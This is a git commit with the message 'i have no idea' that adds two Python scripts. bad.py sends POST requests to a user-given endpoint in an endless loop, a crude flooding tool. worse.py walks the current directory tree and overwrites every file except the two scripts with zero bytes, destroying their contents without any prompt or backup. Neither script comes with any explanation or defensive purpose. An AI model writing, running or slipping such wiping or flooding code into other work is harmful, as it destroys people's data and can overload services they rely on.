f4eb980e79c47a26607f3d7062f0d526c4db79e7
Rohaan Gajjar <rohaan.m.gajjar@gmail.com>
2026-05-18 00:51:18 -0700

    i have no idea

---
+++ bad.py
@@ -0,0 +1,12 @@
+import requests
+data = 'hi'
+endpoint = input('Enter http endpoint')
+if not endpoint.startswith('http'):
+    endpoint = 'http://' + endpoint
+try:
+    requests.post(endpoint, data=data)
+except:
+    endpoint = 'http://127.0.0.1:80'
+
+while 1:
+    requests.post(endpoint, data=data)
---
+++ worse.py
@@ -0,0 +1,18 @@
+import os
+
+flist = []
+
+for f in os.listdir():
+    if f == "worse.py" or f == "bad.py":
+        continue
+    if os.path.isfile(f):
+        flist.append(f)
+    else:
+        for root, dirs, files in os.walk(f):
+            for file in files:
+                file_path = os.path.join(root, file)
+                flist.append(file_path)
+for i in flist:
+    size = os.path.getsize(i)
+    with open(i, 'wb') as g:
+        g.write(b'\x00' * size)
